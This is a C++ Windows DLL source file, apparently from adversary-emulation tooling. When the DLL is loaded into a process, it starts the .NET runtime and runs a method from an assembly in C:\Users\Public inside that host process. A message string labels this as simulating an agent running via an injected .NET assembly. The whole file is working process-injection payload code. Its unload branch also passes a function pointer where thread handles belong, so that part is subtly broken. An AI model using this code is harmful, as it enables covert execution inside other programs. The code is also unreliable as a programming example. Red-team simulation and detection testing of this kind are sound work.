#include <metahost.h>
#include <windows.h>
#pragma comment(lib, "user32.lib") 
#pragma comment(lib, "mscoree.lib")

  
DWORD WINAPI doIt(LPVOID lpParam) 
{
  HRESULT hr;
  ICLRMetaHost* pMetaHost = NULL;
  ICLRRuntimeInfo* pRuntimeInfo = NULL;
  ICLRRuntimeHost* pClrRuntimeHost = NULL;

  hr = CLRCreateInstance(CLSID_CLRMetaHost, IID_PPV_ARGS(&pMetaHost));
  hr = pMetaHost->GetRuntime(L"v4.0.30319", IID_PPV_ARGS(&pRuntimeInfo));
  hr = pRuntimeInfo->GetInterface(CLSID_CLRRuntimeHost, IID_PPV_ARGS(&pClrRuntimeHost));

  hr = pClrRuntimeHost->Start();

  DWORD pReturnValue;
  hr = pClrRuntimeHost->ExecuteInDefaultAppDomain(
    L"C:\\Users\\Public\\DotnetJob.exe",
    L"DotnetJob.Program",
    L"doIt",
    L"Simulating Agent running tempjob via Injected .NET Assembly...",
    &pReturnValue);

  pMetaHost->Release();
  pRuntimeInfo->Release();
  pClrRuntimeHost->Release();

  return 0;
}
 
BOOL APIENTRY DllMain (HINSTANCE hInst, DWORD reason, LPVOID reserved) {
  
  HANDLE tHandle;
  switch (reason) {

    case DLL_PROCESS_ATTACH:
      tHandle = CreateThread(NULL,0,(LPTHREAD_START_ROUTINE)doIt,0,0,NULL);
      break;

    case DLL_PROCESS_DETACH: 
      TerminateThread(doIt,0);
      CloseHandle(doIt); 
      break;

    case DLL_THREAD_ATTACH:
      break;

    case DLL_THREAD_DETACH:
      break;
  }
  return TRUE;
}